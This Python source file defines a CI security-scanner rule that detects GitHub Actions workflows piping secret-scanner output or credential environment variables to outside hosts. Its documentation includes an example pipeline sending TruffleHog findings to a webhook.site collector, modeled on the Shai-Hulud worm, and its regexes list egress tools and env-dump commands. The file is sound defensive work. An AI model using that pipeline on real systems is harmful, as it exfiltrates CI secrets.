"""GHA-057. Secret-scanner output sent to network egress."""
from __future__ import annotations

import re
from typing import Any

from ...base import Finding, Severity
from ...rule import Rule
from ..base import iter_jobs, iter_steps, step_location, workflow_triggers

RULE = Rule(
    id="GHA-057",
    title="Secret-scanner output sent to network egress",
    severity=Severity.CRITICAL,
    owasp=("CICD-SEC-4", "CICD-SEC-6"),
    esf=("ESF-D-CODE-INTEGRITY", "ESF-D-INJECTION"),
    cwe=("CWE-200", "CWE-552"),
    recommendation=(
        "Stop piping secret-scanner output to a network egress tool. "
        "Legitimate scans write their findings to the workspace, the "
        "Code Scanning API (SARIF upload), or the workflow log — none "
        "of which involve ``curl`` / ``wget`` / ``nc`` / ``gh api "
        "POST``. If the scanner is run on a fork-PR-style trigger "
        "(``pull_request_target`` / ``issue_comment`` / "
        "``workflow_run``), move it to a vanilla ``pull_request`` "
        "trigger so an attacker can't supply the scanner's "
        "configuration or scan path. Pin the scanner action to a "
        "commit SHA, not a tag, and gate the upload step behind a "
        "protected environment."
    ),
    docs_note=(
        "Three shapes fire:\n\n"
        "1. ``trufflehog`` / ``gitleaks`` invocation in a ``run:`` "
        "block whose stdout pipes to ``curl`` / ``wget`` / ``nc`` / "
        "``gh api -X POST`` — this is the harvest leg of the Shai-"
        "Hulud worm postinstall and any similar credential-stealer "
        "primitive.\n"
        "2. ``trufflehog`` / ``gitleaks`` invoked unconditionally on a "
        "workflow whose triggers include ``pull_request_target``, "
        "``issue_comment``, or ``workflow_run`` — the scanner is "
        "running with privileged secrets on an attacker-influenced "
        "trigger, so even if the output isn't piped to egress today, "
        "the next person editing the workflow can land that change "
        "via a PR comment.\n"
        "3. ``curl`` / ``wget`` / ``httpie`` POST/PUT/PATCH (or "
        "``--data`` upload) to a non-GitHub host whose payload "
        "references ``${{ secrets.* }}``, a credential-named env var "
        "(``$GITHUB_TOKEN``, ``$NPM_TOKEN``, ``$AWS_*`` keys, etc.), "
        "or dumps the runner env (``$(env)``, ``$(printenv)``, "
        "``env > ...``). Catches the third-party-webhook exfil shape "
        "where the scanner doesn't run at all — the workflow simply "
        "POSTs a build-telemetry payload to an external service that, "
        "if the domain lapses or the service is breached, leaks every "
        "downstream build's env (which includes ``GITHUB_TOKEN`` "
        "always, plus any mapped ``${{ secrets.* }}``). GitHub-owned "
        "hosts are allow-listed (``github.com``, "
        "``api.github.com``, ``*.githubusercontent.com``, "
        "``codecov.io`` for the canonical upload path).\n\n"
        "Legitimate uses pass: scanner output written to "
        "``${{ github.workspace }}`` or a file under the repo, output "
        "uploaded via ``github/codeql-action/upload-sarif`` (CodeQL "
        "API, not raw HTTP), and any invocation gated by a "
        "``push``-to-default-branch ``if:`` predicate."
    ),
    known_fp=(
        "Security teams that run secret scanners and POST results to "
        "their own internal SOAR / ticketing system trip the egress "
        "leg of this rule. Suppress on the specific step with a "
        "rationale that names the destination host; the rule's "
        "default posture is that any scanner-to-network pipe is "
        "credential-exfil-shaped.",
    ),
    incident_refs=(
        "Shai-Hulud npm worm (Sept 2025): the postinstall payload ran "
        "TruffleHog against the filesystem and cloud metadata "
        "endpoints, then POSTed the discovered secrets to "
        "``webhook.site/<uuid>`` and a public GitHub repo created by "
        "the worm. The TruffleHog leg is what made the secrets "
        "worth stealing; without it the worm would have nothing to "
        "exfiltrate.",
    ),
    exploit_example=(
        "# Vulnerable: the scanner harvests secrets, the pipe sends\n"
        "# them to a public collector. The Shai-Hulud postinstall\n"
        "# ran an in-line equivalent of this exact pipeline.\n"
        "jobs:\n"
        "  harvest:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: actions/checkout@<sha>\n"
        "      - run: |\n"
        "          trufflehog filesystem . --json \\\n"
        "            | curl -X POST --data-binary @- \\\n"
        "                https://webhook.site/<uuid>\n"
        "\n"
        "# Safe: the scanner runs, output is uploaded via the\n"
        "# official Code Scanning API. No raw network egress.\n"
        "jobs:\n"
        "  scan:\n"
        "    runs-on: ubuntu-latest\n"
        "    permissions: { security-events: write }\n"
        "    steps:\n"
        "      - uses: actions/checkout@<sha>\n"
        "      - run: trufflehog filesystem . --json > findings.sarif\n"
        "      - uses: github/codeql-action/upload-sarif@<sha>\n"
        "        with: { sarif_file: findings.sarif }"
    ),
)


# Secret-scanner CLIs whose output, in a worm context, is the loot.
_SCANNER_RE = re.compile(
    r"\b(?:trufflehog|gitleaks|noseyparker|detect-secrets|ggshield)\b",
    re.IGNORECASE,
)

# Egress tools that, when fed scanner output, complete the harvest.
# ``gh api -X POST`` is included because it sends arbitrary JSON to a
# GitHub-hosted endpoint that the attacker can control (their own
# repo's issues/comments). ``aws s3 cp - s3://...`` similarly.
_EGRESS_RE = re.compile(
    r"\b(?:curl|wget|nc|ncat|httpie|http\s|"
    r"gh\s+api\s+(?:-X\s+|--method\s+)?(?:POST|PUT|PATCH)|"
    r"aws\s+s3\s+(?:cp|sync)|"
    r"gsutil\s+cp|az\s+storage\s+blob\s+upload)\b",
    re.IGNORECASE,
)

# HTTP-egress invocation with a write verb. Folds the four common
# clients (curl / wget / httpie / http) and any of the canonical
# write-verb shapes (``-X POST``, ``--method POST``, ``--data``,
# ``-d``, ``--data-binary``, ``--data-raw``, ``--upload-file``).
# ``wget --post-data`` is the wget-side analogue; ``http POST`` is
# httpie's positional verb form.
_HTTP_WRITE_RE = re.compile(
    r"\b(?:"
    r"curl\s+[^\n]*?(?:-X\s+(?:POST|PUT|PATCH)|--method\s+(?:POST|PUT|PATCH)|"
    r"--data(?:-binary|-raw|-urlencode)?\s|-d\s|--upload-file\s)"
    r"|wget\s+[^\n]*?(?:--post-data|--post-file|--method[= ](?:POST|PUT|PATCH))"
    r"|httpie?\s+(?:POST|PUT|PATCH)\b"
    r")",
    re.IGNORECASE,
)

# Find the URL the egress command targets. Captures the first
# ``https?://host[/path]`` token after the egress invocation; the
# group 1 capture is the host (used for allowlist matching).
_EGRESS_URL_RE = re.compile(
    r"https?://(?P<host>[A-Za-z0-9.\-]+)(?:[/:?#\s]|$)",
    re.IGNORECASE,
)

# GitHub-owned / GitHub-adjacent hosts that the rule allowlists. A
# POST to one of these is not third-party exfil. Includes the API,
# the raw-content host, the Actions artifact storage host, Codecov
# (the canonical telemetry upload service that legitimately consumes
# build-system env in its payload), and the npm/PyPI registries (so
# ``npm publish`` / ``twine upload`` over their own HTTP client
# doesn't trip the rule).
_ALLOWLIST_HOST_SUFFIXES: tuple[str, ...] = (
    "github.com",
    "githubusercontent.com",
    "githubapp.com",
    "codecov.io",
    "registry.npmjs.org",
    "pypi.org",
    "files.pythonhosted.org",
)

# Credential-shaped env-var names commonly bound to secrets. Match
# inside ``$NAME`` / ``${NAME}`` / ``$ENV{NAME}`` and bare-word
# references in the same ``run:`` body. The list mirrors the
# credential-key tokens the secrets scanner uses, with the GitHub-
# provided runtime tokens (``GITHUB_TOKEN``, ``GH_TOKEN``) added —
# those land in env automatically on every run and an env-dump
# carries them.
_SECRET_ENV_REF_RE = re.compile(
    r"\$(?:\{?(?P<a>"
    r"GITHUB_TOKEN|GH_TOKEN|NPM_TOKEN|NODE_AUTH_TOKEN|PYPI_TOKEN|"
    r"TWINE_PASSWORD|RUBYGEMS_API_KEY|CARGO_REGISTRY_TOKEN|"
    r"AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|"
    r"ANTHROPIC_API_KEY|OPENAI_API_KEY|HF_TOKEN|HUGGINGFACE_TOKEN|"
    r"SLACK_TOKEN|STRIPE_SECRET_KEY|DOCKER_PASSWORD"
    r")\}?)|"
    # Generic shape: any ``$NAME`` whose name matches the
    # credential-keyword regex used elsewhere in the pack.
    r"\$\{?(?P<b>[A-Z][A-Z0-9_]*(?:TOKEN|SECRET|PASSWORD|API_KEY|PRIVATE_KEY|CREDENTIAL))\}?",
)

# Shell primitives that dump the whole runtime env into stdout. Even
# without a literal ``secrets.*`` reference, an env dump fed to a
# third-party POST exfils ``GITHUB_TOKEN`` and every mapped secret in
# one shot.
_ENV_DUMP_RE = re.compile(
    r"\b(?:env|printenv)\b(?!\s*=)"   # env / printenv as a verb, not env= as assignment
    r"|/proc/self/environ"
    r"|/proc/\d+/environ",
)

# Triggers an attacker can influence by sending a PR, issue comment,
# or by uploading a poisoned artifact that the privileged workflow_run
# consumes.
_UNTRUSTED_TRIGGERS = frozenset({
    "pull_request_target", "issue_comment", "workflow_run",
})

# Event names whose firing implies the workflow run is privileged but
# not attacker-influenced. A step gated to one of these via an ``if:``
# predicate is safe even when the workflow declares an untrusted
# trigger alongside (the common ``on: [push, pull_request_target]``
# shape).
_TRUSTED_EVENT_GUARD_RE = re.compile(
    r"github\.event_name\s*==\s*['\"]"
    r"(?:push|schedule|workflow_dispatch)['\"]",
    re.IGNORECASE,
)


def _scanner_piped_to_egress(line: str) -> bool:
    """True when *line* runs a secret scanner whose stdout is piped
    to a network egress tool. The caller is expected to have folded
    backslash-continued lines into a single string first; see
    ``_join_shell_continuations``.
    """
    if not _SCANNER_RE.search(line):
        return False
    # The pipe must come *after* the scanner invocation. Split on the
    # first ``|`` (but not ``||``) and look for the scanner on the
    # left, an egress tool on the right.
    parts = re.split(r"(?<!\|)\|(?!\|)", line, maxsplit=1)
    if len(parts) != 2:
        return False
    left, right = parts
    return bool(_SCANNER_RE.search(left) and _EGRESS_RE.search(right))


def _join_shell_continuations(body: str) -> str:
    r"""Fold ``<backslash><newline>`` line continuations into a single
    logical line so a pipeline like ``trufflehog ... \`` followed by
    ``| curl ...`` is seen as one shell command."""
    return re.sub(r"\\\n", " ", body)


def _if_restricts_to_trusted_event(expr: object) -> bool:
    """True when an ``if:`` predicate gates execution to a trusted
    event only. Conservative: any reference to an untrusted trigger
    name (in either side of ``==`` / ``!=`` / ``||`` etc.) defeats
    the guard, because we can't statically prove the expression
    excludes that path."""
    if not isinstance(expr, str):
        return False
    e = expr.strip()
    if e.startswith("${{") and e.endswith("}}"):
        e = e[3:-2].strip()
    e_lower = e.lower()
    if any(utr in e_lower for utr in _UNTRUSTED_TRIGGERS):
        return False
    return bool(_TRUSTED_EVENT_GUARD_RE.search(e))


def _host_is_allowlisted(host: str) -> bool:
    """True when *host* ends in one of the github-owned / known-safe
    suffixes. Match is suffix-anchored on a dot boundary so
    ``evil-github.com`` doesn't sneak past ``github.com``.
    """
    host = host.lower().strip(".")
    for suffix in _ALLOWLIST_HOST_SUFFIXES:
        if host == suffix or host.endswith("." + suffix):
            return True
    return False


def _step_body_carries_secret_material(body: str) -> str | None:
    """Return a short label for the secret-material shape present in
    *body*, or ``None`` if none of the shapes match.

    Three shapes count:
    - explicit ``${{ secrets.* }}`` interpolation (the canonical GHA
      expression for a stored secret);
    - reference to a credential-named env var via ``$NAME`` /
      ``${NAME}``;
    - shell primitive that dumps the runtime env
      (``env``, ``printenv``, ``/proc/self/environ``).
    """
    if "${{ secrets." in body or "${{secrets." in body:
        return "secrets.* interpolated"
    if _SECRET_ENV_REF_RE.search(body):
        return "credential env var referenced"
    if _ENV_DUMP_RE.search(body):
        return "env dump captured"
    return None


def _third_party_egress_with_secrets(body: str) -> str | None:
    """Return an offender label when *body* posts to a non-allowlisted
    host with secret material on the command line. Otherwise ``None``.

    The egress detector is line-scoped after backslash-continuation
    folding, so a multi-line ``curl ... \\`` invocation followed by
    its data block lands as one logical command.
    """
    if not _HTTP_WRITE_RE.search(body):
        return None
    urls = list(_EGRESS_URL_RE.finditer(body))
    if not urls:
        return None
    if any(not _host_is_allowlisted(m.group("host")) for m in urls):
        # At least one URL is third-party; now require secret material
        # in the same body.
        shape = _step_body_carries_secret_material(body)
        if shape is None:
            return None
        offending_hosts = [
            m.group("host") for m in urls
            if not _host_is_allowlisted(m.group("host"))
        ]
        return (
            f"HTTP POST to third-party host ({offending_hosts[0]}) "
            f"carrying secret material ({shape})"
        )
    return None


def _scanner_in_step(step: dict[str, Any]) -> bool:
    """True when a step's ``run:`` body or ``uses:`` references a
    secret-scanner CLI. Used to flag scanners invoked under an
    untrusted trigger even without a network-pipe."""
    run = step.get("run")
    if isinstance(run, str) and _SCANNER_RE.search(run):
        return True
    uses = step.get("uses")
    if isinstance(uses, str) and _SCANNER_RE.search(uses):
        return True
    return False


def check(path: str, doc: dict[str, Any]) -> Finding:
    triggers = set(workflow_triggers(doc))
    untrusted_trigger = bool(triggers & _UNTRUSTED_TRIGGERS)
    offenders: list[str] = []
    locations = []
    for job_id, job in iter_jobs(doc):
        job_if_restricted = _if_restricts_to_trusted_event(job.get("if"))
        for idx, step in enumerate(iter_steps(job)):
            name = step.get("name") or step.get("id") or f"steps[{idx}]"
            label: str | None = None
            run = step.get("run")
            if isinstance(run, str):
                joined = _join_shell_continuations(run)
                for line in joined.splitlines():
                    if _scanner_piped_to_egress(line):
                        label = "scanner output piped to network egress"
                        break
                if label is None:
                    third_party = _third_party_egress_with_secrets(joined)
                    if third_party is not None:
                        label = third_party
            if label is None and untrusted_trigger and _scanner_in_step(step):
                # Skip when the step or its parent job restricts execution
                # to a trusted event (push / schedule / workflow_dispatch);
                # an untrusted trigger declared alongside is then unreachable.
                step_if_restricted = _if_restricts_to_trusted_event(step.get("if"))
                if not (step_if_restricted or job_if_restricted):
                    label = (
                        "secret scanner invoked under untrusted trigger "
                        f"({', '.join(sorted(triggers & _UNTRUSTED_TRIGGERS))})"
                    )
            if label is None:
                continue
            offenders.append(f"{job_id}.{name}: {label}")
            locations.append(step_location(path, step))
    passed = not offenders
    desc = (
        "No secret-scanner-to-egress pattern detected."
        if passed else
        f"{len(offenders)} step(s) treat a secret scanner as a harvest "
        f"primitive: {', '.join(offenders[:5])}"
        f"{'…' if len(offenders) > 5 else ''}. Piping TruffleHog or "
        f"gitleaks output to ``curl`` / ``gh api POST`` is the "
        f"Shai-Hulud loot-extraction shape."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
        locations=locations,
    )
